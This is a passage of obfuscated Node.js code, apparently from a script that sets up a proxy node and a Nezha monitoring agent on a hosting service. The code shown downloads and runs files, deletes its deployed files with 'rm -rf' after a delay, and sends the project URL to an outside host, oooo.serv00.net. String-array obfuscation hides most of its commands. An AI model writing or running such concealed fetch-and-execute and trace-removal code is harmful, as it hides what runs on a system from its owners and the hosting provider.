NEZHA_SERVER&&NEZHA_KEY&&_0x1fcfff[_0x229748(0x1c1)](phpPath);process[_0x229748(0x1f3)]==='win32'?exec(_0x229748(0x233)+_0x1fcfff['join']('\x20')+_0x229748(0x1dc),_0x56ae9f=>{const _0x4412fc=_0x229748;console[_0x4412fc(0x265)](),console[_0x4412fc(0x1f7)](_0x4412fc(0x1a0)),console[_0x4412fc(0x1f7)](_0x4412fc(0x262));}):exec('rm\x20-rf\x20'+_0x1fcfff[_0x229748(0x1ce)]('\x20')+_0x229748(0x238),_0x60365e=>{const _0x3f2266=_0x229748;console[_0x3f2266(0x265)](),console[_0x3f2266(0x1f7)](_0x3f2266(0x1a0)),console[_0x3f2266(0x1f7)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3c5505=_0x5c84dc;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3c5505(0x224));return;}try{const _0x7fb9f9=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3c5505(0x19d)}});return console[_0x3c5505(0x1f7)](_0x3c5505(0x1d2)),_0x7fb9f9;}catch(_0x1fcda8){return console[_0x3c5505(0x1fa)](_0x3c5505(0x241)+_0x1fcda8[_0x3c5505(0x1e2)]),null;}}async function startserver(){const _0x22c951=_0x5c84dc;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2a62e6){console[_0x22c951(0x1fa)](_0x22c951(0x1f1),_0x2a62e6);}}function _0x2566(_0x2ccb3d,_0x81a592){const _0x5dbb41=_0x3045();return _0x2566=function(_0x2d168c,_0x37f25c){_0x2d168c=_0x2d168c-0x19c;let _0x21fca8=_0x5dbb41[_0x2d168c];return _0x21fca8;},_0x2566(_0x2ccb3d,_0x81a592);}startserver()['catch'](_0x1d9e67=>{const _0x28bc45=_0x5c84dc;console[_0x28bc45(0x1fa)](_0x28bc45(0x211),_0x1d9e67);}),app['listen'](PORT,()=>console[_0x5c84dc(0x1f7)](_0x5c84dc(0x201)+PORT+'!'));
